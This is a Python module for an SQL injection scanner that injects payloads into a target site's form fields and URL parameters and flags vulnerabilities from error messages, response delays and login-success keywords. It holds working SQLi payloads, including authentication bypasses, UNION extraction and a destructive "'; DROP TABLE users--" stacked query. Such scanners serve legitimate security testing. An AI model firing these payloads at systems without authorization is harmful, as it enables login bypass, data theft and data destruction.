"""
SQL Injection Scanner
"""

import asyncio
import re
from typing import List, Dict, Any
from urllib.parse import urlencode, urlparse, parse_qs
from ..utils.data_loader import data_loader


class SQLiScanner:
    """Scanner for SQL Injection vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize SQLi scanner"""
        self.config = config
        self.session = session
        self.payloads = self._load_payloads()
        self.error_patterns = self._load_error_patterns()
        
    def _load_payloads(self) -> List[Dict[str, str]]:
        """Load SQL injection payloads from data file"""
        # Load raw payloads from file
        file_payloads = data_loader.load_sqli_payloads()
        
        # Convert to structured format with types
        structured_payloads = []
        
        for payload in file_payloads:
            # Determine payload type based on content
            payload_type = 'error-based'
            
            if 'UNION' in payload.upper():
                payload_type = 'union-based'
            elif 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload:
                payload_type = 'time-based'
            elif 'OR' in payload.upper() and '=' in payload:
                payload_type = 'boolean-based'
            elif '--' in payload or '#' in payload:
                if 'admin' in payload.lower():
                    payload_type = 'authentication-bypass'
                else:
                    payload_type = 'boolean-blind'
            elif ';' in payload and ('DROP' in payload.upper() or 'INSERT' in payload.upper() or 'EXEC' in payload.upper()):
                payload_type = 'stacked'
                
            structured_payloads.append({
                'payload': payload,
                'type': payload_type
            })
        
        # Basic fallback payloads if file is empty
        basic_payloads = [
            # Basic SQLi
            {'payload': "'", 'type': 'error-based'},
            {'payload': "' OR '1'='1", 'type': 'boolean-based'},
            {'payload': "' OR 1=1--", 'type': 'boolean-based'},
            {'payload': "' OR '1'='1'--", 'type': 'boolean-based'},
            {'payload': "admin'--", 'type': 'authentication-bypass'},
            
            # UNION-based
            {'payload': "' UNION SELECT NULL--", 'type': 'union-based'},
            {'payload': "' UNION SELECT NULL,NULL--", 'type': 'union-based'},
            {'payload': "' UNION SELECT NULL,NULL,NULL--", 'type': 'union-based'},
            
            # Time-based blind
            {'payload': "' AND SLEEP(5)--", 'type': 'time-based', 'dbms': 'mysql'},
            {'payload': "'; WAITFOR DELAY '00:00:05'--", 'type': 'time-based', 'dbms': 'mssql'},
            {'payload': "' AND pg_sleep(5)--", 'type': 'time-based', 'dbms': 'postgresql'},
            
            # Boolean-based blind
            {'payload': "' AND 1=1--", 'type': 'boolean-blind'},
            {'payload': "' AND 1=2--", 'type': 'boolean-blind'},
            
            # Stacked queries
            {'payload': "'; DROP TABLE users--", 'type': 'stacked'},
            
            # Advanced
            {'payload': "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 'type': 'time-based'},
            {'payload': "1' AND '1'='1' UNION SELECT table_name FROM information_schema.tables--", 'type': 'union-based'},
        ]
        
        # Use file payloads if available, otherwise use basic payloads
        return structured_payloads if structured_payloads else basic_payloads
    
    def _load_error_patterns(self) -> List[Dict[str, str]]:
        """Load SQL error patterns"""
        return [
            # MySQL
            {'pattern': r'SQL syntax.*?MySQL', 'dbms': 'mysql'},
            {'pattern': r'Warning.*?mysql_.*', 'dbms': 'mysql'},
            {'pattern': r'MySQLSyntaxErrorException', 'dbms': 'mysql'},
            {'pattern': r'valid MySQL result', 'dbms': 'mysql'},
            
            # PostgreSQL
            {'pattern': r'PostgreSQL.*?ERROR', 'dbms': 'postgresql'},
            {'pattern': r'Warning.*?pg_.*', 'dbms': 'postgresql'},
            {'pattern': r'PSQLException', 'dbms': 'postgresql'},
            
            # Microsoft SQL Server
            {'pattern': r'Driver.*? SQL[\-\_\ ]*Server', 'dbms': 'mssql'},
            {'pattern': r'OLE DB.*? SQL Server', 'dbms': 'mssql'},
            {'pattern': r'(\[SQL Server\])', 'dbms': 'mssql'},
            {'pattern': r'ODBC SQL Server Driver', 'dbms': 'mssql'},
            
            # Oracle
            {'pattern': r'ORA-[0-9][0-9][0-9][0-9]', 'dbms': 'oracle'},
            {'pattern': r'Oracle error', 'dbms': 'oracle'},
            {'pattern': r'Oracle.*?Driver', 'dbms': 'oracle'},
            
            # SQLite
            {'pattern': r'SQLite/JDBCDriver', 'dbms': 'sqlite'},
            {'pattern': r'SQLite.Exception', 'dbms': 'sqlite'},
            {'pattern': r'System.Data.SQLite.SQLiteException', 'dbms': 'sqlite'},
            
            # Generic
            {'pattern': r'syntax error', 'dbms': 'generic'},
            {'pattern': r'unclosed quotation mark', 'dbms': 'generic'},
            {'pattern': r'quoted string not properly terminated', 'dbms': 'generic'},
        ]
    
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Scan forms
        for form in recon_data.get('forms', []):
            form_vulns = await self._scan_form(target, form)
            vulnerabilities.extend(form_vulns)
        
        # Scan URL parameters
        for param in recon_data.get('inputs', []):
            if param.get('type') == 'url_param':
                param_vulns = await self._scan_url_param(target, param)
                vulnerabilities.extend(param_vulns)
        
        return vulnerabilities
    
    async def _scan_form(self, base_url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan form for SQLi"""
        vulnerabilities = []
        
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        
        # Build form URL
        if action:
            from urllib.parse import urljoin
            form_url = urljoin(base_url, action)
        else:
            form_url = base_url
        
        # Test each input field
        for input_field in form.get('inputs', []):
            input_name = input_field.get('name')
            if not input_name:
                continue
            
            # Skip certain types
            if input_field.get('type') in ['submit', 'button', 'file']:
                continue
            
            # Test with each payload
            for payload_info in self.payloads[:8]:  # Use top 8 payloads
                payload = payload_info['payload']
                payload_type = payload_info['type']
                
                try:
                    # Build form data
                    form_data = {}
                    for inp in form.get('inputs', []):
                        inp_name = inp.get('name')
                        if inp_name:
                            if inp_name == input_name:
                                form_data[inp_name] = payload
                            else:
                                form_data[inp_name] = inp.get('value', '1')
                    
                    # Send request
                    import time
                    start_time = time.time()
                    
                    if method == 'POST':
                        async with self.session.post(form_url, data=form_data) as response:
                            content = await response.text()
                            response_time = time.time() - start_time
                    else:
                        async with self.session.get(form_url, params=form_data) as response:
                            content = await response.text()
                            response_time = time.time() - start_time
                    
                    # Check for vulnerability
                    vuln_info = self._check_vulnerability(payload, payload_type, content, response_time)
                    
                    if vuln_info:
                        vulnerabilities.append({
                            'type': 'sqli',
                            'severity': 'critical',
                            'url': form_url,
                            'method': method,
                            'parameter': input_name,
                            'payload': payload,
                            'sqli_type': payload_type,
                            'dbms': vuln_info.get('dbms', 'unknown'),
                            'evidence': vuln_info.get('evidence', ''),
                            'description': f'SQL Injection ({payload_type}) found in form parameter "{input_name}"',
                            'remediation': 'Use parameterized queries or prepared statements',
                            'cwe': 'CWE-89',
                            'owasp': 'A03:2021 - Injection',
                        })
                        break
                
                except Exception as e:
                    print(f"[!] SQLi scan error: {e}")
                    continue
        
        return vulnerabilities
    
    async def _scan_url_param(self, url: str, param: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan URL parameter for SQLi"""
        vulnerabilities = []
        
        param_name = param.get('name')
        if not param_name:
            return vulnerabilities
        
        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test each payload
        for payload_info in self.payloads[:8]:
            payload = payload_info['payload']
            payload_type = payload_info['type']
            
            try:
                # Build test URL
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                # Send request
                import time
                start_time = time.time()
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                
                # Check for vulnerability
                vuln_info = self._check_vulnerability(payload, payload_type, content, response_time)
                
                if vuln_info:
                    vulnerabilities.append({
                        'type': 'sqli',
                        'severity': 'critical',
                        'url': test_url,
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'sqli_type': payload_type,
                        'dbms': vuln_info.get('dbms', 'unknown'),
                        'evidence': vuln_info.get('evidence', ''),
                        'description': f'SQL Injection ({payload_type}) found in URL parameter "{param_name}"',
                        'remediation': 'Use parameterized queries or prepared statements',
                        'cwe': 'CWE-89',
                        'owasp': 'A03:2021 - Injection',
                    })
                    break
            
            except Exception as e:
                print(f"[!] SQLi URL param scan error: {e}")
                continue
        
        return vulnerabilities
    
    def _check_vulnerability(self, payload: str, payload_type: str, 
                           content: str, response_time: float) -> Dict[str, Any]:
        """Check if SQL injection vulnerability exists"""
        
        # Error-based detection
        if payload_type == 'error-based':
            for error_pattern in self.error_patterns:
                if re.search(error_pattern['pattern'], content, re.IGNORECASE):
                    return {
                        'dbms': error_pattern['dbms'],
                        'evidence': self._extract_evidence(error_pattern['pattern'], content),
                        'detection_method': 'error-based',
                    }
        
        # Time-based detection
        if payload_type == 'time-based':
            if response_time >= 4.5:  # Expecting 5 second delay
                return {
                    'dbms': 'time-based-detected',
                    'evidence': f'Response time: {response_time:.2f}s (expected delay: 5s)',
                    'detection_method': 'time-based',
                }
        
        # Boolean-based detection (simplified)
        if payload_type == 'boolean-based':
            # Look for common success indicators
            if any(indicator in content.lower() for indicator in ['welcome', 'dashboard', 'logged in']):
                return {
                    'dbms': 'boolean-based-detected',
                    'evidence': 'Authentication bypass successful',
                    'detection_method': 'boolean-based',
                }
        
        # UNION-based detection
        if payload_type == 'union-based':
            if 'null' in content.lower() and re.search(r'union.*?select', payload, re.IGNORECASE):
                return {
                    'dbms': 'union-based-detected',
                    'evidence': 'UNION query successful',
                    'detection_method': 'union-based',
                }
        
        return None
    
    def _extract_evidence(self, pattern: str, content: str, max_length: int = 200) -> str:
        """Extract evidence of SQL error"""
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 50)
            end = min(len(content), match.end() + 50)
            return content[start:end]
        return "SQL error detected in response"
